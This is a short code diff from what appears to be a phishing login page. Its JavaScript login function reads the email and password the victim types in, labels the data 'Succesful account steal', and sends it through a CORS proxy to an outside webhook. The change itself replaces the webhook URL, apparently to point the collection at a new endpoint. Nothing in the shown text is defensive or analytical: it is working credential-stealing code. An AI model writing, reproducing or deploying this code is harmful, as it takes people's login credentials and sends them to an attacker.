@@ -1,7 +1,7 @@
 target = document.getElementById('default_panel')
 function login(){
     const data = '{"name":"Succesful account steal","data":{"username":"'+ document.getElementById('txtemail').value+ '","password":"'+ document.getElementById('txtpassword').value+ '",}';
-    const url = 'https://corsproxy.io/?' + encodeURIComponent('https://typedwebhook.tools/webhook/f2de3d81-7c4a-44dd-9626-6ee007db9b48'); 
+    const url = 'https://corsproxy.io/?' + encodeURIComponent('https://typedwebhook.tools/webhook/04232482-b67a-418b-aedc-67edde5b1d73'); 
     let xhr = new XMLHttpRequest();
     xhr.withCredentials = true;
     xhr.open('POST', url);
